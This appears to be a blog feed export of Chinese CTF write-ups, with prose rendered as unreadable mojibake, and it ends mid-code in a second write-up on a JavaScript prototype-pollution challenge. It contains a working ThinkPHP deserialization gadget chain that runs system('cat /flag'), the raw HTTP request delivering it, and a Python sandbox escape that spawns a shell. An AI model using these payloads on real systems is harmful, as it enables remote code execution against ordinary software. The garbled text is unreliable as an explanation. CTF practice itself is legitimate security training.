å®¡è®¡ï¼Œä¼šå‘ç°å…¶å­˜åœ¨åº”è¯¥æ–¹æ³•ä¸ºUsers<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">users</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">AdminUser</span>;</span><br><span class="line">        <span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$datas</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;è·å–æˆåŠŸ&quot;</span>, ]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ä¼šå‘ç°ä»–ä¼šåœ¨å±å¹•å›æ˜¾adminUserçš„ä¿¡æ¯ã€‚<br>è¿˜æœ‰æœ€åä¸€ä¸ªé—®é¢˜æˆ‘ä»¬åº”è¯¥æ€ä¹ˆè§¦å‘è¿™äº›æ–¹æ³•å‘¢ï¼Ÿè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦æŸ¥çœ‹å¼€å‘è€…æ‰‹å†Œäº†ã€‚<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/Thinkphp-3.png" class="" title="alt text"><br>è¿™é‡Œè®²äº†å½“æˆ‘ä»¬éœ€è¦è®¿é—®åº”è¯¥å¯¹è±¡çš„æ–¹æ³•æ—¶æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨<code>url/å¯¹è±¡å/æ–¹æ³•å</code>æ¥è¿›è¡Œè°ƒç”¨ã€‚<br>ä¸Šé¢å°±æ˜¯ä»£å®¡çš„æ‰€æœ‰å†…å®¹äº†ï¼Œç›¸ä¿¡æˆ‘å†™çš„è¿™ä¹ˆè¯¦ç»†èªæ˜çš„ä½ çœ‹åˆ°è¿™é‡Œè‚¯å®šæ˜¯æç„¶å¤§å§(å˜¿å˜¿)ã€‚<br>æˆ‘ä»¬è¾“å…¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28065/api/users</span><br></pre></td></tr></table></figure><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/thinkphp-4.png" class="" title="alt text"><br>å›æ˜¾äº†è´¦å·å¯†ç æˆ‘ä»¬ç›´æ¥ç™»é™†<br>ä¹‹åå°±å¯ä»¥ä½¿ç”¨api/updateè¿˜æœ‰api/listä¸¤ä¸ªè·¯ç”±è¿›è¡Œååºåˆ—åŒ–äº†ã€‚ä¸‹é¢æ˜¯ååºåˆ—åŒ–çš„exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=[<span class="string">&#x27;jiang&#x27;</span>=&gt;<span class="string">&#x27;cat /flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$withAttr</span>=[<span class="string">&#x27;jiang&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">ModelEvent</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$suffix</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;suffix = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /api/update HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28065</span><br><span class="line">Content-Length: 1000</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://node4.anna.nssctf.cn:28065</span><br><span class="line">Referer: http://node4.anna.nssctf.cn:28065/admin/index</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: PHPSESSID=ed1a8c62688654d3c80e971dc4478867</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">data=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨è®¿é—®api/listå°±å¯ä»¥äº†<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/thinkphp-5.png" class="" title="alt text"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="real-signin"><a href="#real-signin" class="headerlink" title="real_signin"></a>real_signin</h2><p>è§£é¢˜äººï¼šLSE<br>ç½‘ä¸Šä¸€æœå°±èƒ½æœé“è¿™äº›æ˜¯å°å“çš„å†…å®¹ï¼Œå†ç”¨è®¡ç®—æœºç®—ä¸€ä¸‹mdåŠ å¯†ä¸€ä¸‹ã€‚</p><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>è§£é¢˜äººï¼šLSE<br>æ²™ç®±é€ƒé€¸ç½‘ä¸Šèƒ½æœåˆ°<br><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code><br>è¿™æ ·å°±å¯ä»¥getshellä¹‹åå°±ls cat /flag</p><h2 id="æ˜¯åå–è¯"><a href="#æ˜¯åå–è¯" class="headerlink" title="æ˜¯åå–è¯"></a>æ˜¯åå–è¯</h2><p>è§£é¢˜äººï¼šLSE<br>éé¢„æœŸäº†ç›´æ¥å°†å†…å­˜é•œåƒæ”¾å‘å“¦010é‡ŒæŸ¥flag3å°±æŸ¥åˆ°äº†</p><h2 id="ä½›è¯´å–è¯"><a href="#ä½›è¯´å–è¯" class="headerlink" title="ä½›è¯´å–è¯"></a>ä½›è¯´å–è¯</h2><p>è§£é¢˜äººï¼šLSE<br>è¿™é¢˜æˆ‘å…ˆæ˜¯åœ¨AXIOM Processä¸Šæ‰¾åˆ°äº†flag1.zipå’Œflag2.zipã€‚ç„¶åä¸çŸ¥é“è¿™ä¹ˆå¯¼å‡ºæ–‡ä»¶å°±ç”¨äº†volatilityæ¥å¯¼å‡ºæ–‡ä»¶<br>volatility -f 1.vmem â€”profile=Win7SP1x64 filescan | grep â€œflagâ€æ¥æ‰¾å‡ºæ–‡ä»¶ï¼Œå°±æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘æ‰¾ä¸åˆ°flag1ï¼Œæ‰€æœ‰æˆ‘grepä¸Šäº†æˆ‘ä¹‹å‰åœ¨AXIOM Processä¸Šæ‰¾åˆ°çš„flag1çš„è·¯å¾„<br>ç„¶åå¯¼å‡ºæ–‡ä»¶<br>volatility -f 1.vmem â€”profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./<br>å¯¼å‡ºä¹‹åå‘ç°æ˜¯ä½›æœ‰æ›°æ˜¯è¦å¯†ç çš„ï¼Œè¿™æ˜¯æˆ‘åœ¨å‰ªåˆ‡æ¿å‘ç°äº†ä¸€ä¸²å­—ç¬¦ä¸²ã€‚å†ä»¥å…¶ä¸ºå¯†é’¥è§£ç ä½›åˆæ›°å°±å‡ºæ¥äº†</p><h2 id="å–œæ¬¢æˆ‘çš„æ‰‹å¤å—"><a href="#å–œæ¬¢æˆ‘çš„æ‰‹å¤å—" class="headerlink" title="å–œæ¬¢æˆ‘çš„æ‰‹å¤å—"></a>å–œæ¬¢æˆ‘çš„æ‰‹å¤å—</h2><p>è§£é¢˜äººï¼šLSE<br>è¿™é¢˜æˆ‘ä»¬å¯ä»¥å†ç½‘ä¸ŠæŸ¥ä¸€ä¸‹æ¨¡æ‹Ÿå™¨æ€ä¹ˆåˆ é™¤æ‰å¯†ç ï¼Œä¼šæ‰¾åˆ°å¾ˆå¤šæ–‡ç« ã€‚å¯¹è¿™åšæˆ‘ä»¬å°±èƒ½åˆ é™¤å…¶å¯†ç ã€‚<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sj-1.png" class="" title="alt text"><br>è¿›å…¥æ‰‹æœºåæˆ‘ä»¬æŸ¥çœ‹å…¶ç›¸å†Œå¯ä»¥å‘ç°ä¸€ä¸ªç½‘ç›˜é“¾æ¥ä¸‹è½½ä¸‹æ¥ã€‚<br>ä¼šå¾—åˆ°ä¸€ä¸²ä»¥U2FsdGVkXå¼€å¤´çš„å­—ç¬¦ï¼ˆä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯base64è½¬å›¾ç‰‡ç»“æœä¸æ˜¯ï¼‰ã€‚æˆ‘ä»¬å†æ‰“å¼€é€šè®¯å½•ä¼šå‘ç°keyï¼Œå°†å…¶æ‹¼æ¥èµ·æ¥ã€‚å†è¿›è¡ŒAESè§£ç ã€‚å¾—åˆ°å¦ä¸€é•¿ä¸²ç¼–ç ï¼Œé•¿å¾—å¾ˆåƒbase64æˆ‘ä»¬è¿›è¡Œè§£ç å†å¯¼å…¥åˆ°010é‡ŒæŸ¥çœ‹ã€‚ä¼šå‘ç°å…¶å¼€å¤´ä¸ºzipçš„æ–‡ä»¶å¤´ï¼Œæˆ‘ä»¬æœç´¢ 50 4B 03 04 è¿˜æœ‰50 4B 01 02ä¼šå‘ç°å…¶å4ä¸ªå­—èŠ‚ä¸ºå¶æ•°æ˜¯ä¼ªåŠ å¯†å°†å…¶æ”¹æˆ00å°±å¯ä»¥ç›´æ¥è§£å‹äº†ã€‚</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Helloworld"><a href="#Helloworld" class="headerlink" title="Helloworld"></a>Helloworld</h2><p>è§£é¢˜äººï¼šLSE<br>ç›´æ¥ncè¿æ¥å†ls /<br>cat /flag</p><h1 id="LOT"><a href="#LOT" class="headerlink" title="LOT"></a>LOT</h1><h2 id="ç¥ç§˜çš„OLEDæƒ…ä¹¦2-èµ·"><a href="#ç¥ç§˜çš„OLEDæƒ…ä¹¦2-èµ·" class="headerlink" title="ç¥ç§˜çš„OLEDæƒ…ä¹¦2-èµ·"></a>ç¥ç§˜çš„OLEDæƒ…ä¹¦2-èµ·</h2><p>è§£é¢˜ï¼šHBQ</p><p>é¢˜ç›®è®©æˆ‘ä»¬ç¡®å®šSTM32çš„è¾“å…¥ç”µå‹ï¼ˆä¿ç•™1ä½å°æ•°å¹¶å¸¦ä¸Šå•ä½ï¼‰ã€‚<br>ä¸Šç½‘æŸ¥ä¸€ä¸‹STM32çš„è¾“å…¥ç”µå‹èŒƒå›´ï¼Œå‘ç°æ˜¯2.0~3.6ï¼Œè€Œåªè¦ä¿ç•™ä¸€ä½å°æ•°ï¼Œæ‰€ä»¥åªæœ‰17ç§å¯èƒ½æ€§ï¼Œç›´æ¥ç©·ä¸¾æ³•ï¼Œå‘ç°3.3Væ˜¯æ­£ç¡®çš„flagã€‚</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto1921"><a href="#Crypto1921" class="headerlink" title="Crypto1921"></a>Crypto1921</h2><p>è§£é¢˜ï¼šZWK<br>åœ¨codeçš„txtæ–‡ä»¶ä¸­ï¼Œå‘ç°æ‘©æ–¯ç”µç å¯†æ–‡ï¼Œå°†å¯†æ–‡è½¬åŒ–åï¼Œä¸ºä¸€æ®µæ•°å­—ç”¨æ–œæ†åˆ†éš”æˆå››ä¸ªä¸ºä¸€ç»„çš„æ•°å­—ï¼Œé€šè¿‡æŸ¥é˜…èµ„æ–™å‘ç°ï¼Œè¯¥æ®µæ•°å­—å¯é€šè¿‡ä¸­æ–‡ç”µç è¯‘ä¸ºä¸­æ–‡<br>ç”±æ–‡å­—å†…å®¹å¯çŸ¥ï¼Œäº‹ä»¶å‘ç”Ÿåæ ‡ä½ç½®ï¼Œæ ¹æ®å•ä½è¿›è¡Œæ¢ç®—ï¼Œå¾—åˆ°ç¬¦åˆæ¡ä»¶çš„åæ ‡å¯†ç ï¼Œå¯è§£telegram.tetæ–‡ä»¶<br>ç”±æ–‡ä»¶å†…å®¹å¾—å°†æ–‡å­—ç”±åŸæ¥æ ¼å¼è½¬åŒ–ä¸ºä¸­æ–‡ç”µç ï¼Œåœ¨è½¬ä¸ºæ‘©æ–¯ç”µç åï¼Œç»è¿‡md5åŠ å¯†ï¼Œä¸ºæœ€ç»ˆflagå‹ç¼©åŒ…çš„å¯†ç </p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgameweek3</title>
      <link href="/2024/02/26/hgameweek3/"/>
      <url>/2024/02/26/hgameweek3/</url>
      
        <content type="html"><![CDATA[<h1 id="è¯´èµ·æ¥å¾ˆå¯è€»è¿™å‘¨çš„hgameæˆ‘æ²¡æœ‰æ‰“ï¼Œè¿™ç¯‡åšå®¢åªèƒ½ç®—æˆ‘çš„èµ›åå¤ç°ï¼Œè¿‡ä¸ªå¹´æŠŠäººç»™è¿‡çš„å¤ªé¢“åºŸäº†ã€‚"><a href="#è¯´èµ·æ¥å¾ˆå¯è€»è¿™å‘¨çš„hgameæˆ‘æ²¡æœ‰æ‰“ï¼Œè¿™ç¯‡åšå®¢åªèƒ½ç®—æˆ‘çš„èµ›åå¤ç°ï¼Œè¿‡ä¸ªå¹´æŠŠäººç»™è¿‡çš„å¤ªé¢“åºŸäº†ã€‚" class="headerlink" title="è¯´èµ·æ¥å¾ˆå¯è€»è¿™å‘¨çš„hgameæˆ‘æ²¡æœ‰æ‰“ï¼Œè¿™ç¯‡åšå®¢åªèƒ½ç®—æˆ‘çš„èµ›åå¤ç°ï¼Œè¿‡ä¸ªå¹´æŠŠäººç»™è¿‡çš„å¤ªé¢“åºŸäº†ã€‚"></a>è¯´èµ·æ¥å¾ˆå¯è€»è¿™å‘¨çš„hgameæˆ‘æ²¡æœ‰æ‰“ï¼Œè¿™ç¯‡åšå®¢åªèƒ½ç®—æˆ‘çš„èµ›åå¤ç°ï¼Œè¿‡ä¸ªå¹´æŠŠäººç»™è¿‡çš„å¤ªé¢“åºŸäº†ã€‚</h1><h1 id="webvpn"><a href="#webvpn" class="headerlink" title="webvpn"></a>webvpn</h1><p>è¯´å®è¯è¿™é“é¢˜ç›®ä¸ç®—å¤ªéš¾ï¼Œè™½ç„¶æˆ‘æ˜¯çœ‹äº†wpå…ˆå…¥ä¸ºä¸»è¯´çš„è¯ã€‚é¦–å…ˆè¿™é“é¢˜ç›®éœ€è¦ä½¿ç”¨jsååºåˆ—åŒ–ï¼Œåœ¨çœ‹wpçš„æ—¶å€™æˆ‘éƒ½å·²ç»æŠŠä¹‹å‰å­¦jsåŸå‹é“¾æ±¡æŸ“çš„å†…å®¹å¿˜äº†ä¸€å¤§åŠäº†ã€‚<a href=".../../../../2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">åˆæ¢jsåŸå‹é“¾æ±¡æŸ“</a><br>é¢˜ç›®ç»™äº†æºç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">&quot;uuid&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> session_name = <span class="string">&quot;my-webvpn-session-id-&quot;</span> + <span class="title function_">uuidv4</span>().<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;pug&quot;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;trust proxy&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;public&quot;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(</span><br><span class="line">  <span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: session_name,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">uuidv4</span>().<span class="title function_">toString</span>(),</span><br><span class="line">    <span class="attr">secure</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"><span class="keyword">var</span> userStorage = &#123;</span><br><span class="line">  <span class="attr">username</span>: &#123;</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">    <span class="attr">info</span>: &#123;</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">strategy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;baidu.com&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&quot;google.com&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">dst, src</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key.<span class="title function_">indexOf</span>(<span class="string">&quot;__&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> src[key] == <span class="string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="title function_">update</span>(dst[key], src[key]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dst[key] = src[key];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/proxy&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username &#125; = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">if</span> (!username) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> url = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">query</span>.<span class="property">url</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;invalid 